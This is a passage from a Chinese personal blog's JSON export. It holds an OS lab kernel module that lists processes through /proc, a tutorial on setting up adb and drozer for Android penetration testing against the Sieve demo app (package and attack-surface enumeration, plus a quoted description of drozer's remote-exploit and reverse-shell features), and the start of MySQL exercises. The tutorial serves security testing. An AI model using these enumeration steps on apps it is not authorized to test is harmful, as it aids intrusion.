c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifneq ($(KERNELRELEASE),)</span><br><span class=\"line\">\tobj-m:=readprocess.o</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">\tKDIR:= /lib/modules/$(shell uname -r)/build</span><br><span class=\"line\">\tPWD:= $(shell pwd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t$(MAKE) -C $(KDIR) M=$(PWD) modules</span><br><span class=\"line\">clean:</span><br><span class=\"line\">\t$(MAKE) -C $(KDIR) M=$(PWD) clean</span><br><span class=\"line\">endif</span><br></pre></td></tr></table></figure>\n\n<p>利用内核模块编程，在 /proc 目录下用自己的学号创建一个目录，如 /proc/201300834101</p>\n<blockquote>\n<p>Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc 文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p>\n<p>用户和应用程序可以通过 proc 得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取 proc 文件时，proc 文件系统是动态从系统内核读出所需信息并提交的。下面列出的这些文件或子文件夹，并不是都是在你的系统中存在，这取决于你的内核配置和装载的模块。另外，在 /proc 下还有三个很重要的目录：net，scsi 和sys。 Sys 目录是可写的，可以通过它来访问或修改内核的参数，而 net 和 scsi 则依赖于内核配置。例如，如果系统不支持 scsi，则 scsi 目录不存在。</p>\n<p>还有一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在 /proc下，以进程的 PID号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link。</p>\n</blockquote>\n<p>然后在学号目录下创建一个 processinfo 文件，/proc/201300834101/processinfo ，此文件为只读文件，用于显示所有内核进程的程序名、PID 号和进程状态。主要步骤：</p>\n<p>修改 readprocess 模块，在模块初始化函数中创建目录及 proc 文件，并定义产生 proc 文件内容的函数（获取进程信息）；</p>\n<p>在卸载模块函数中删除相应的 proc 文件及目录；<br>​修改Makefile文件，编译、安装模块；<br>​执行cat /proc/201300834101/processinfo 命令，查看进程信息。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Processinfo.c</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/module.h&gt;\t// 初始化模块</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/proc_fs.h&gt;\t// 创建进程信息入口</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/sched/task.h&gt;\t// 初始进程</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/seq_file.h&gt;\t// 序列文件</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/slab.h&gt;       // 内存分配释放  </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/sched/signal.h&gt;   //下一个进程</span></span></span><br><span class=\"line\"><span class=\"keyword\">char</span> modname[] = <span class=\"string\">\"201708034210\"</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">task_struct</span>  *<span class=\"title\">task</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">int</span>  taskcounts=<span class=\"number\">0</span>;\t\t\t<span class=\"comment\">// 全局进程变量</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> * <span class=\"title\">my_seq_start</span><span class=\"params\">(struct seq_file *m, <span class=\"keyword\">loff_t</span> *pos)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   <span class=\"comment\">///printk(KERN_INFO\"Invoke start\\n\");   //可以输出调试信息</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> ( *pos == <span class=\"number\">0</span> )  <span class=\"comment\">// 表示遍历开始</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">\t   task = &amp;init_task;\t<span class=\"comment\">//遍历开始的记录地址</span></span><br><span class=\"line\">\t   <span class=\"keyword\">return</span> &amp;task;   <span class=\"comment\">//返回一个非零值表示开始遍历</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"comment\">//遍历过程中</span></span><br><span class=\"line\">  &#123; </span><br><span class=\"line\">  \t<span class=\"keyword\">if</span> (task == &amp;init_task ) \t<span class=\"comment\">//重新回到初始地址，退出</span></span><br><span class=\"line\">  \t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  \t<span class=\"keyword\">return</span> (<span class=\"keyword\">void</span>*)pos\t;<span class=\"comment\">//否则返回一个非零值</span></span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">my_seq_show</span><span class=\"params\">(struct seq_file *m, <span class=\"keyword\">void</span> *v)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;<span class=\"comment\">//获取进程的相关信息</span></span><br><span class=\"line\">  <span class=\"comment\">//printk(KERN_INFO\"Invoke show\\n\");</span></span><br><span class=\"line\">  \t\t\t\t</span><br><span class=\"line\">  seq_printf( m,  <span class=\"string\">\"#%-3d\\t \"</span>, taskcounts );   <span class=\"comment\">//输出进程序号</span></span><br><span class=\"line\">  seq_printf( m,  <span class=\"string\">\"%d\\t\"</span>, task-&gt;pid );\t\t\t<span class=\"comment\">//输出进程pid</span></span><br><span class=\"line\">  seq_printf( m,  <span class=\"string\">\"%lu\\t \"</span>, task-&gt;state );\t\t<span class=\"comment\">//输出进程state</span></span><br><span class=\"line\">  seq_printf( m,  <span class=\"string\">\"%s\\t \"</span>, task-&gt;comm );\t\t<span class=\"comment\">//输出进程名称(comm)</span></span><br><span class=\"line\">  seq_puts( m, <span class=\"string\">\"\\n\"</span> );\t  \t\t\t\t  </span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> * <span class=\"title\">my_seq_next</span><span class=\"params\">(struct seq_file *m, <span class=\"keyword\">void</span> *v, <span class=\"keyword\">loff_t</span> *pos)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//printk(KERN_INFO\"Invoke next\\n\");  </span></span><br><span class=\"line\">  (*pos)++;   </span><br><span class=\"line\">  <span class=\"comment\">//task指向下一个进程?</span></span><br><span class=\"line\">  taskcounts++;</span><br><span class=\"line\">  task= next_task(task);  <span class=\"comment\">//指向下一个进程</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">my_seq_stop</span><span class=\"params\">(struct seq_file *m, <span class=\"keyword\">void</span> *v)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//printk(KERN_INFO\"Invoke stop\\n\");\t\t</span></span><br><span class=\"line\">\t<span class=\"comment\">// do nothing        </span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">seq_operations</span> <span class=\"title\">my_seq_fops</span> = &#123;</span><span class=\"comment\">//序列文件记录操作函数集合</span></span><br><span class=\"line\">        .start  = my_seq_start,</span><br><span class=\"line\">        .next   = my_seq_next,</span><br><span class=\"line\">        .stop   = my_seq_stop,</span><br><span class=\"line\">        .show   = my_seq_show</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">my_open</span><span class=\"params\">(struct inode *inode, struct file *file)</span>  </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> seq_open(file, &amp;my_seq_fops); <span class=\"comment\">//打开序列文件并关联my_seq_fops</span></span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file_operations</span> <span class=\"title\">my_proc</span> =   </span></span><br><span class=\"line\"><span class=\"class\">&#123;</span>  <span class=\"comment\">//proc文件操作函数集合</span></span><br><span class=\"line\">\t.owner      = THIS_MODULE,  </span><br><span class=\"line\">\t.open       = my_open,</span><br><span class=\"line\">\t.read       = seq_read,     </span><br><span class=\"line\">\t.llseek     = seq_lseek,</span><br><span class=\"line\">\t.release    = seq_release  \t    </span><br><span class=\"line\">&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">init <span class=\"title\">my_init</span><span class=\"params\">( <span class=\"keyword\">void</span> )</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">proc_dir_entry</span>* <span class=\"title\">my_proc_entry</span>;</span></span><br><span class=\"line\">\tprintk( <span class=\"string\">\"&lt;1&gt;\\nInstalling \\'%s\\' module\\n\"</span>, modname );</span><br><span class=\"line\">\tmy_proc_entry = proc_create(modname, <span class=\"number\">0x644</span>, <span class=\"literal\">NULL</span>, &amp;my_proc);<span class=\"comment\">//生成proc文件</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"literal\">NULL</span> == my_proc_entry)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> -ENOMEM;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>\t<span class=\"number\">0</span>;  <span class=\"comment\">//SUCCESS</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> __<span class=\"function\"><span class=\"built_in\">exit</span> <span class=\"title\">my_exit</span><span class=\"params\">( <span class=\"keyword\">void</span> )</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tremove_proc_entry( modname, <span class=\"literal\">NULL</span> );<span class=\"comment\">//删除proc文件</span></span><br><span class=\"line\">\tprintk( <span class=\"string\">\"&lt;1&gt;Removing \\'%s\\' module\\n\"</span>, modname );\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">module_init(my_init);</span><br><span class=\"line\">module_exit(my_exit);</span><br><span class=\"line\">MODULE_LICENSE(<span class=\"string\">\"GPL\"</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Makefile</span><br><span class=\"line\">ifneq ($(KERNELRELEASE),)</span><br><span class=\"line\">\tobj-m:=processinfo.o</span><br><span class=\"line\">else</span><br><span class=\"line\">\tKDIR:= /lib/modules/$(shell uname -r)/build</span><br><span class=\"line\">\tPWD:= $(shell pwd)</span><br><span class=\"line\"></span><br><span class=\"line\">default:</span><br><span class=\"line\"><span class=\"meta\">\t$</span><span class=\"bash\">(MAKE) -C $(KDIR) M=$(PWD) modules</span></span><br><span class=\"line\">clean:</span><br><span class=\"line\"><span class=\"meta\">\t$</span><span class=\"bash\">(MAKE) -C $(KDIR) M=$(PWD) clean</span></span><br><span class=\"line\">Endif</span><br></pre></td></tr></table></figure>\n\n","text":"OS实验一 进程控制 fork()用于创建一个新进程（子进程）。函数原型：1<br>2<br>3<br>#include &lt;unistd.h&gt;<br><br>pid_t fork(void);<br>返回：子进程中为0，父进程中为子进程ID，出错为-1。子进程被创建后","link":"","raw":null,"photos":[],"categories":[{"name":"os","slug":"os","count":1,"path":"api/categories/os.json"}],"tags":[{"name":"os","slug":"os","count":1,"path":"api/tags/os.json"}]},{"title":"搭建 Android 调试环境","slug":"Android-调试","date":"2020-04-29T05:40:34.000Z","updated":"2020-04-29T05:46:39.591Z","comments":true,"path":"api/articles/Android-调试.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"搭建-Android-调试环境\"><a href=\"#搭建-Android-调试环境\" class=\"headerlink\" title=\"搭建 Android 调试环境\"></a>搭建 Android 调试环境</h1><h2 id=\"安装adb\"><a href=\"#安装adb\" class=\"headerlink\" title=\"安装adb\"></a>安装adb</h2><p>首先保证 <code>java</code>, <code>javac</code>, <code>java -version</code> 都正常。</p>\n<p>打开 <code>adt-bundle-windows-x86_64-20130219</code> 压缩包，里边已经装好了必需的包。打开 <code>sdk</code>文件夹，将 <code>tools</code> 和 <code>platform-tools</code> 路径配置到系统变量中。</p>\n<p>此时打开 <code>cmd</code> 输入 <code>adb</code> 就能看到 <code>adb options</code> 了。</p>\n<h2 id=\"安装-drozer\"><a href=\"#安装-drozer\" class=\"headerlink\" title=\"安装 drozer\"></a>安装 drozer</h2><p>打开下载的 <code>drozer-install</code> 压缩包，双击里边的  <code>setup.exe</code> 安装，里边还有一个 <code>agent.apk</code> ，这个装到要调试的手机里。</p>\n<p>安装完将 <code>bin</code> 目录添加到环境变量中即可。</p>\n<p><strong>在 <code>drozer</code> 目录中</strong>打开 cmd ，输入 <code>drozer</code> 即可看到 options 选项。</p>\n<h2 id=\"开始调试\"><a href=\"#开始调试\" class=\"headerlink\" title=\"开始调试\"></a>开始调试</h2><p>cmd 输入 <code>adb devices</code> 查看连接的设备</p>\n<p>注：如果找不到设备可以在电脑设备管理器处打开便携设备，查看当前连接的手机的硬件ID，类似于这样： <code>USB\\VID_05C6&amp;PID_9039&amp;MI_00</code> ，然后进入 <code>C:\\Users\\xxx\\.android</code> 目录 <code>adb_usb.ini</code> 文件(没有就新建这个文件),输入 <code>0x05C6</code> </p>\n<p>重新 <code>adb devices</code> 即可看到设备。</p>\n<p>常用命令：</p>\n<p><code>adb shell</code> 即可进入命令交互界面</p>\n<p><code>adb connect ip:port</code> 连接指定设备</p>\n<p>使用 <code>drozer agent</code> 中的 <code>server embedded</code> 将测试设备与 PC 连接起来</p>\n<p>先选择一个合适的端口以便 PC 能连接到 drozer agent 开放的 TCP socket</p>\n<pre><code>adb forward tcp:31415 tcp:31415</code></pre><p>然后在要调试的手机中安装 agent.apk ，安装完后打开监听，默认端口是31415，将手机连到电脑上打开开发者模式调试状态(进入关于手机，版本号处连续点击3次即可进入开发者模式)。</p>\n<p>然后就可以使用 drozer 连接了</p>\n<p>进入 drozer 安装目录命令行输入： <code>drozer console connect</code> 即可进入命令行调试界面</p>\n<p>注：如果这里报错需要检查如下项目</p>\n<p>1、JDK是否安装</p>\n<p>2、环境变量是否正确配置（命令行下执行：java、javac、java -version 命令是否返回正常数据）</p>\n<p>如果以上项目均正常的话可做如下修复：</p>\n<p>建立名为 .drozer_config的文件，文件中添加如下内容：</p>\n<pre><code>[executables]\njava=D:\\Java\\jdk1.7.0_65\\bin\\java.exe\njavac=D:\\Java\\jdk1.7.0_65\\bin\\javac.exe</code></pre><p>即java和javac的路径，保存后存放到C:\\Users\\XXX\\ 目录下，其中XXX为当前用户名目录下，之后重新连接成功</p>\n<h3 id=\"drozer-使用\"><a href=\"#drozer-使用\" class=\"headerlink\" title=\"drozer 使用\"></a>drozer 使用</h3><p><strong>What is drozer?</strong></p>\n<blockquote>\n<p>drozer allows you to assume the role of an Android app and interact with other apps. It can do anything that an installed application can do, such as make use ofAndroid’s Inter-Process Communication (IPC) mechanism and interact with the underlying operating system. </p>\n<p>drozer also helps to you to remotely exploit Android devices, by building malicious files or web pages that exploit known vulnerabilities. The payload that is used in these exploits is a rogue drozer agent that is essentially a remote administration tool. Depending on the permissions granted to the vulnerable app, drozer can install a full agent, inject a limited agent into the process using a novel technique or spawn a reverse shell.</p>\n</blockquote>\n<h4 id=\"找到目标\"><a href=\"#找到目标\" class=\"headerlink\" title=\"找到目标\"></a>找到目标</h4><p>第一步是查找我们要调试的包</p>\n<pre><code>run app.package.list 查看所有安装在手机上应用程序的包名</code></pre><p>查找要测试的包名 xxx</p>\n<pre><code>dz&gt; run app.package.list -f xxx\ncom.example.xxx (xxx)</code></pre><p>我们可以让 drozer 提供一些关于这个包的基本信息，使用 <code>app.package.info</code> </p>\n<pre><code>dz&gt; run app.package.info -a com.mwr.example.sieve \nPackage: com.mwr.example.sieve\nProcess Name: com.mwr.example.sieve\nVersion: 1.0\nData Directory: /data/data/com.mwr.example.sieve\nAPK Path: /data/app/com.mwr.example.sieve-2.apk\nUID: 10056\nGID: [1028, 1015, 3003]\nShared Libraries: null\nShared User ID: null\nUses Permissions:</code></pre><h4 id=\"探测攻击面\"><a href=\"#探测攻击面\" class=\"headerlink\" title=\"探测攻击面\"></a>探测攻击面</h4><p>我们可以让 drozer 报告包的攻击面</p>\n<pre><code>dz&gt; run app.package.attacksurface com.mwr.example.sieve\nAttack Surface:\n    3 activities exported\n    0 broadcast receivers exported\n    2 content providers exported\n    2 services expo\n        is debuggable</code></pre><p>This shows that we have a number of potential vectors. The app ‘exports’ (makes accessible to other apps) a number of activities (screens used by the app), content providers (database objects) and services (background workers).</p>\n<p>We also note that the service is debuggable, which means that we can attach a debugger to the process, using adb, and step through the code.</p>\n<h4 id=\"Launching-Activities\"><a href=\"#Launching-Activities\" class=\"headerlink\" title=\"Launching Activities\"></a>Launching Activities</h4><p>我们可以使用更精确的命令来深入挖掘攻击面</p>\n<pre><code>dz&gt; run app.activity.info -a com.mwr.example.sieve \nPackage:com.mwr.example.sieve\n    com.mwr.example.sieve.FileSelectActivity\n    com.mwr.example.sieve.MainLoginActivit\n    com.mwr.example.sieve.PWLi</code></pre><h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/JDragons/p/5596258.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/JDragons/p/5596258.html</a></p>\n</blockquote>\n","text":"搭建 Android 调试环境安装adb首先保证 java, javac, java -version 都正常。打开 adt-bundle-windows-x86_64-20130219 压缩包，里边已经装好了必需的包。打开 sdk文件夹，将 tools 和 platform-t","link":"","raw":null,"photos":[],"categories":[{"name":"penetration test","slug":"penetration-test","count":2,"path":"api/categories/penetration-test.json"}],"tags":[{"name":"penetration test","slug":"penetration-test","count":2,"path":"api/tags/penetration-test.json"},{"name":"Android","slug":"Android","count":1,"path":"api/tags/Android.json"}]},{"title":"数据库概论","slug":"数据库概论","date":"2020-04-29T05:40:34.000Z","updated":"2020-04-30T02:51:41.447Z","comments":true,"path":"api/articles/数据库概论.json","excerpt":"","keywords":null,"cover":"C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317092800919.png","content":"<h1 id=\"数据库概论\"><a href=\"#数据库概论\" class=\"headerlink\" title=\"数据库概论\"></a>数据库概论</h1><h2 id=\"E-R图\"><a href=\"#E-R图\" class=\"headerlink\" title=\"E-R图\"></a>E-R图</h2><h2 id=\"增删改查\"><a href=\"#增删改查\" class=\"headerlink\" title=\"增删改查\"></a>增删改查</h2><h3 id=\"创建新表并插入数据\"><a href=\"#创建新表并插入数据\" class=\"headerlink\" title=\"创建新表并插入数据\"></a>创建新表并插入数据</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show tables;</span><br><span class=\"line\">+<span class=\"comment\">-----------------------+</span></span><br><span class=\"line\">| Tables_in_studentinfo |</span><br><span class=\"line\">+<span class=\"comment\">-----------------------+</span></span><br><span class=\"line\">| course                |</span><br><span class=\"line\">| sc                    |</span><br><span class=\"line\">| studente              |</span><br><span class=\"line\">+<span class=\"comment\">-----------------------+</span></span><br></pre></td></tr></table></figure>\n\n<p>将三个表全部删除然后新建新的表：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; drop table course;</span><br><span class=\"line\">mysql&gt; drop table sc;</span><br><span class=\"line\">mysql&gt; drop table studente;</span><br><span class=\"line\">mysql&gt; show tables;</span><br><span class=\"line\">Empty <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></table></figure>\n\n<p>要创建的表的属性：</p>\n<p><img src=\"C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317092800919.png\" alt=\"image-20200317092800919\"></p>\n<p><img src=\"C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317092828418.png\" alt=\"image-20200317092828418\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; create table Student</span><br><span class=\"line\">    -&gt; (Sno char(12) PRIMARY KEY, //主键</span><br><span class=\"line\">    -&gt; Sname char(20) UNIQUE NOT NULL, //不为空且取值唯一</span><br><span class=\"line\">    -&gt; Ssex char(8) DEFAULT 'male', //默认值 male</span><br><span class=\"line\">    -&gt; Sage int(4),</span><br><span class=\"line\">    -&gt; Sdept char(15)</span><br><span class=\"line\">    -&gt; );</span><br><span class=\"line\">mysql&gt; desc student;</span><br><span class=\"line\">+<span class=\"comment\">-------+----------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Field | Type     | Null | Key | Default | Extra |</span><br><span class=\"line\">+<span class=\"comment\">-------+----------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Sno   | char(12) | NO   | PRI | NULL    |       |</span><br><span class=\"line\">| Sname | char(20) | NO   | UNI | NULL    |       |</span><br><span class=\"line\">| Ssex  | char(8)  | YES  |     | male    |       |</span><br><span class=\"line\">| Sage  | int(4)   | YES  |     | NULL    |       |</span><br><span class=\"line\">| Sdept | char(15) | YES  |     | NULL    |       |</span><br><span class=\"line\">+<span class=\"comment\">-------+----------+------+-----+---------+-------+</span></span><br><span class=\"line\">5 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.01</span> sec)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; create table Course</span><br><span class=\"line\">    -&gt; (Cno char(15) PRIMARY KEY,</span><br><span class=\"line\">    -&gt; Cname char(20) NOT NULL,</span><br><span class=\"line\">    -&gt; Cpno char(15),</span><br><span class=\"line\">    -&gt; Credits SMALLINT //小整型</span><br><span class=\"line\">    -&gt; );</span><br><span class=\"line\">Query OK, 0 rows affected (0.48 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; desc course;</span><br><span class=\"line\">+<span class=\"comment\">---------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Field   | Type        | Null | Key | Default | Extra |</span><br><span class=\"line\">+<span class=\"comment\">---------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">| Cno     | char(15)    | NO   | PRI | NULL    |       |</span><br><span class=\"line\">| Cname   | char(20)    | NO   |     | NULL    |       |</span><br><span class=\"line\">| Cpno    | char(15)    | YES  |     | NULL    |       |</span><br><span class=\"line\">| Credits | smallint(6) | YES  |     | NULL    |       |</span><br><span class=\"line\">+<span class=\"comment\">---------+-------------+------+-----+---------+-------+</span></span><br><span class=\"line\">4 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.01</span> sec)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; CREATE TABLE SC(</span><br><span class=\"line\">    -&gt; Sno char(12),</span><br><span class=\"line\">    -&gt; Cno char(15),</span><br><span class=\"line\">    -&gt; 